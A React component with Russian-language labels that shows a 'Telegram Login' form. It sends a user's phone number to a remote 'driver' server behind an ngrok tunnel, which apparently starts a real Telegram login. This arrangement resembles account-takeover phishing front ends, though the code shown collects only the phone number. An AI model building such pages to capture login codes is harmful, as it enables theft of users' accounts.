import React, { useState, useEffect } from "react";
import axios from "axios";

function TelegramLogin() {
  const [phone, setPhone] = useState("");
  const [status, setStatus] = useState("checking");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  const [success, setSuccess] = useState(false);

  const API_URL = "https://0576d32f6aa9.ngrok-free.app";

  // Проверка статуса драйвера
  const checkDriverStatus = async () => {
    try {
      const response = await axios.get(`${API_URL}/status`);
      setStatus(response.data.status);
    } catch (err) {
      setError("Ошибка соединения с сервером");
      setStatus("error");
    }
  };

  useEffect(() => {
    checkDriverStatus();
    const interval = setInterval(checkDriverStatus, 5000);
    return () => clearInterval(interval);
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError(null);

    try {
      const response = await axios.post(`${API_URL}/start-login`, { phone });
      setSuccess(true);
    } catch (err) {
      setError(err.response?.data?.error || "Ошибка отправки номера");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div style={styles.container}>
      <h2 style={styles.title}>Telegram Login</h2>

      <div style={styles.status}>
        Статус драйвера:
        <span
          style={{
            color:
              status === "ready"
                ? "green"
                : status === "error"
                ? "red"
                : "orange",
            fontWeight: "bold",
          }}
        >
          {status === "ready"
            ? "Готов"
            : status === "error"
            ? "Ошибка"
            : "Загрузка..."}
        </span>
      </div>

      {error && <div style={styles.error}>{error}</div>}

      {success ? (
        <div style={styles.success}>
          Номер успешно отправлен! Проверьте Telegram для кода подтверждения.
        </div>
      ) : (
        <form onSubmit={handleSubmit} style={styles.form}>
          <input
            type="tel"
            placeholder="+XX XXX XXX XX XX"
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            style={styles.input}
            required
            pattern="\+[0-9]{1,3} [0-9]{3} [0-9]{3} [0-9]{2} [0-9]{2}"
          />

          <button
            type="submit"
            style={{
              ...styles.button,
              backgroundColor: status !== "ready" ? "#ccc" : "#0088cc",
              cursor: status !== "ready" ? "not-allowed" : "pointer",
            }}
            disabled={status !== "ready" || loading}
          >
            {loading ? "Отправка..." : "Отправить номер"}
          </button>
        </form>
      )}
    </div>
  );
}

const styles = {
  container: {
    maxWidth: "400px",
    margin: "50px auto",
    padding: "20px",
    borderRadius: "8px",
    boxShadow: "0 2px 10px rgba(0,0,0,0.1)",
    fontFamily: "Arial, sans-serif",
  },
  title: {
    textAlign: "center",
    color: "#333",
    marginBottom: "20px",
  },
  status: {
    padding: "10px",
    margin: "10px 0",
    backgroundColor: "#f5f5f5",
    borderRadius: "4px",
    textAlign: "center",
  },
  error: {
    color: "white",
    backgroundColor: "#ff4444",
    padding: "10px",
    borderRadius: "4px",
    margin: "10px 0",
    textAlign: "center",
  },
  success: {
    color: "white",
    backgroundColor: "#00C851",
    padding: "15px",
    borderRadius: "4px",
    textAlign: "center",
    marginTop: "20px",
  },
  form: {
    display: "flex",
    flexDirection: "column",
    gap: "15px",
    marginTop: "20px",
  },
  input: {
    padding: "12px",
    fontSize: "16px",
    borderRadius: "4px",
    border: "1px solid #ddd",
    outline: "none",
    transition: "border 0.3s",
    ":focus": {
      borderColor: "#0088cc",
    },
  },
  button: {
    padding: "12px",
    fontSize: "16px",
    color: "white",
    border: "none",
    borderRadius: "4px",
    fontWeight: "bold",
    transition: "background-color 0.3s",
  },
};

export default TelegramLogin;
